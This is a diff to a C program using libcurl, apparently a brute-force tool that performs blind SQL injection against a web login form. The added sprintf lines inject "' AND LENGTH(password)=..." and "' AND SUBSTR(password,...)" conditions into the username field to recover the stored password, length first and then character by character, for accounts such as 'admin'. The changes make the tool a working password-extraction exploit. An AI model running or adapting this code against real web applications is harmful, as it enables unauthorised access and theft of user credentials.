@@ -25,18 +25,18 @@
 #define END_CHAR   126
 #define MIN_LEN    1
 #define MAX_LEN    20
-#define USR_INPUT_NAME "login"
+#define USR_INPUT_NAME "user"
 #define PWD_INPUT_NAME "password"
 #define PWD_DB_NAME    "password"
-#define USERNAME_1 "user1"
+#define USERNAME_1 "admin"
 #define USERNAME_2 "user2"
 #define USERNAME_3 "user3"
 #define USERNAME_4 "user4"
 #define USERNAME_5 "user5"
 #define USERS_NB   5
 #define SUCCESS_TXT "Welcome"
-#define URL "http://.."
-#define VERBOSE 1
+#define URL "http://"
+#define VERBOSE 0
 
 //global vars
 CURL *curl;
@@ -81,11 +81,17 @@ int main(void){
       usleep(200000);//200ms
 
       //copy current length in char for parameters building
+      /*
       char number[3];
       sprintf(number,"%d",i);
+      */
 
       //parameters building
       char fields[100];
+      
+      sprintf(fields,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,i,PWD_INPUT_NAME);
+      
+      /*
       strcpy(fields,USR_INPUT_NAME);
       strcat(fields,"=");
       strcat(fields,users[u]);
@@ -97,6 +103,7 @@ int main(void){
       strcat(fields,"&");
       strcat(fields,PWD_INPUT_NAME);
       strcat(fields,"=dummy");
+      */
 
       if(VERBOSE) printf("%s\n",fields);
       
@@ -144,14 +151,20 @@ int main(void){
         printf("%c",i);
         fflush(stdout);
         //convert number to char for parameter
+        /*
         char number[3];
         sprintf(number,"%d",j);
+        */
         //get corresponding char
         char ch[2];
         sprintf(ch, "%c", i);
 
         //parameters building
         char fields[100];
+        
+        sprintf(fields,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,j,ch,PWD_INPUT_NAME);
+        
+        /*
         strcpy(fields,USR_INPUT_NAME);
         strcat(fields,"=");
         strcat(fields,users[u]);
@@ -165,6 +178,7 @@ int main(void){
         strcat(fields,"&");
         strcat(fields,PWD_INPUT_NAME);
         strcat(fields,"=dummy");
+        */
 
         if(VERBOSE) printf("%s\n",fields);
 
